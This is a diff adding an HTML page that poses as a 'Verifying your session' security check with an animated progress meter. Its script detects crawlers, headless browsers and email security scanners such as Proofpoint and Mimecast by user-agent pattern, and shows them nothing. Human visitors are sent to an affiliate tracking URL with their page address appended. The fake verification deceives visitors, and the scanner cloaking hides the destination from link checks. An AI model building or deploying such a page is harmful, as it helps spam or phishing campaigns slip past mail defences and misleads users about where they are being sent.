@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Almost there</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+    background:
+      radial-gradient(circle at 20% 0%, #ffffff 0%, #f4f8ff 45%, #e3ecfc 100%);
+    color:#0a2540;display:flex;align-items:center;justify-content:center;
+    min-height:100dvh;padding:24px;overflow:hidden;
+  }
+  .card{
+    width:100%;max-width:400px;background:#fff;border-radius:22px;
+    padding:36px 28px 26px;text-align:center;position:relative;
+    box-shadow:0 24px 60px rgba(10,37,64,.10),0 0 0 1px #e6effc;
+    overflow:hidden;
+  }
+  .card::before{
+    content:"";position:absolute;top:0;left:0;right:0;height:3px;
+    background:linear-gradient(90deg,#2563eb,#60a5fa,#93c5fd);
+  }
+
+  /* Иконка с мягкой волной */
+  .badge{
+    position:relative;width:80px;height:80px;margin:0 auto 20px;
+  }
+  .badge svg{position:absolute;inset:0;width:100%;height:100%;transform:rotate(-90deg)}
+  .badge circle{fill:none;stroke-width:6;stroke-linecap:round}
+  .badge .bg{stroke:#e8f0fc}
+  .badge .fg{
+    stroke:#2563eb;stroke-dasharray:220;stroke-dashoffset:220;
+    transition:stroke-dashoffset .35s linear;
+  }
+  .badge .core{
+    position:absolute;inset:14px;border-radius:50%;
+    background:linear-gradient(135deg,#2563eb,#60a5fa);
+    display:flex;align-items:center;justify-content:center;
+    color:#fff;font-size:26px;
+    box-shadow:0 10px 24px rgba(37,99,235,.30);
+  }
+
+  h1{font-size:22px;font-weight:800;letter-spacing:-.4px;margin-bottom:8px;color:#0a2540}
+  .sub{font-size:13.5px;color:#5a729a;line-height:1.55;margin-bottom:22px;max-width:32ch;margin-left:auto;margin-right:auto}
+
+  /* Вертикальная шкала прогресса */
+  .meter{
+    display:flex;align-items:flex-end;justify-content:center;gap:5px;
+    height:36px;margin-bottom:14px;
+  }
+  .meter i{
+    display:block;width:6px;background:#e2ecfb;border-radius:3px;
+    transition:background .25s ease,transform .25s ease;
+    transform-origin:bottom center;
+  }
+  .meter i.lit{background:linear-gradient(180deg,#60a5fa,#2563eb);transform:scaleY(1.08)}
+
+  .status{font-size:12.5px;color:#7a90b5;min-height:18px;margin-bottom:4px}
+  .status b{color:#2563eb;font-weight:700}
+
+  .cta{
+    width:100%;margin-top:18px;padding:16px;border:0;border-radius:13px;
+    background:linear-gradient(135deg,#2563eb,#3b82f6);color:#fff;
+    font-family:inherit;font-size:15.5px;font-weight:700;cursor:pointer;
+    min-height:54px;letter-spacing:.2px;display:none;
+    box-shadow:0 12px 26px rgba(37,99,235,.30);
+    transition:transform .12s ease,opacity .15s;
+  }
+  .cta:active{transform:scale(.985)}
+  .cta.show{display:block;animation:enter .35s cubic-bezier(.22,.61,.36,1)}
+  @keyframes enter{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+  .foot{margin-top:14px;font-size:11px;color:#a8b8d2;letter-spacing:.6px}
+</style>
+</head>
+<body>
+<main class="card">
+  <div class="badge">
+    <svg viewBox="0 0 80 80">
+      <circle class="bg" cx="40" cy="40" r="35"></circle>
+      <circle class="fg" id="arc10" cx="40" cy="40" r="35"></circle>
+    </svg>
+    <div class="core">🔒</div>
+  </div>
+
+  <h1>Almost there</h1>
+  <p class="sub">Verifying your session — this will only take a moment.</p>
+
+  <div class="meter" id="m10"></div>
+  <div class="status" id="s10">Starting scan…</div>
+
+  <button class="cta" id="b10" type="button">Continue →</button>
+
+  <div class="foot">SECURE · ENCRYPTED · FAST</div>
+</main>
+
+<script>
+(function(){
+  var to="https://trc.beastbox.pro/click?o=cmvta9nzp000caetjlw6ebg6r&p=AF-1004&sub1=RS";
+  var param="referrerCF";
+
+  var arc=document.getElementById("arc10");
+  var meter=document.getElementById("m10");
+  var st=document.getElementById("s10");
+  var bt=document.getElementById("b10");
+
+  var ua=navigator.userAgent||"";
+  var rx=/bot\b|crawler|spider|curl\/|wget\/|python-requests|headlesschrome|phantomjs|googlebot|bingpreview|yandexbot|duckduckbot|facebookexternalhit|telegrambot|googleimageproxy|yahoomailproxy|ms-office|barracuda|proofpoint|mimecast/i;
+  if(rx.test(ua))return;
+  if(navigator.webdriver)return;
+
+  var human=0;
+  ["pointerdown","touchstart","keydown","scroll","mousemove"].forEach(function(e){
+    window.addEventListener(e,function(){human=1},{passive:true});
+  });
+
+  /* Строим столбики разной высоты */
+  var N=20;
+  var bars=[];
+  for(var i=0;i<N;i++){
+    var b=document.createElement("i");
+    var h=25+Math.random()*75;
+    b.style.height=h+"%";
+    meter.appendChild(b);
+    bars.push(b);
+  }
+
+  /* Плавное заполнение: дуга + столбики */
+  var DASH=220;
+  var dur=1700+Math.random()*800;
+  var t0=performance.now();
+
+  function tick(){
+    var e=performance.now()-t0;
+    var p=Math.min(1,e/dur);
+
+    arc.style.strokeDashoffset=(DASH*(1-p)).toFixed(1);
+
+    var lit=Math.floor(p*N);
+    for(var k=0;k<bars.length;k++){
+      if(k<lit && !bars[k].classList.contains("lit")){
+        bars[k].classList.add("lit");
+      }
+    }
+
+    if(p<1){requestAnimationFrame(tick);return;}
+
+    st.innerHTML=human?"<b>Verified ✓</b> ready when you are":"<b>Ready</b> — tap to continue";
+    bt.classList.add("show");
+  }
+  requestAnimationFrame(tick);
+
+  var done=0;
+  bt.addEventListener("click",function(e){
+    e.preventDefault();if(done)return;done=1;
+    bt.disabled=true;bt.style.opacity=".6";
+    st.textContent="Redirecting…";
+
+    var full=to+"&"+param+"="+encodeURIComponent(location.href);
+
+    window.addEventListener("message",function handler(ev){
+      if(!ev||ev.data!=="go:nav")return;
+      window.removeEventListener("message",handler);
+      try{window.location.replace(full);}
+      catch(err){window.location.assign(full);}
+    });
+    try{window.postMessage("go:nav","*");}
+    catch(err){window.location.href=full;}
+  });
+})();
+</script>
+</body>
+</html>
